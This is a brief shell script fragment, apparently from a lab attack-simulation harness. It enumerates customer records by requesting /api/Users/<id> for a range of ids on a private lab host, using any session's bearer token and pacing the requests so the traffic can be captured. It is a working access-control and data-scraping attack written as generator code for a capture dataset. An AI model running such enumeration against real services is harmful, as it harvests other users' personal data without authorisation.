# Source me from ATK-09's variants: `scrape FIRST LAST` fetches GET /api/Users/<id> for every id from
# FIRST to LAST, one at a time, with the token from setup (lib/admin-session.sh; any session works,
# D-30) and curl's own user agent, pausing so half the table takes 2-3 minutes (D-63). Every response
# is captured (lib/capture.sh, D-25), so the converter sees which customers left.
. /attacks/lib/capture.sh
scrape() {
  local id
  for id in $(seq "$1" "$2"); do
    req "http://10.66.0.10/api/Users/$id" -H "Authorization: Bearer $(cat /out/admin.token)"
    sleep 0.9
  done
}
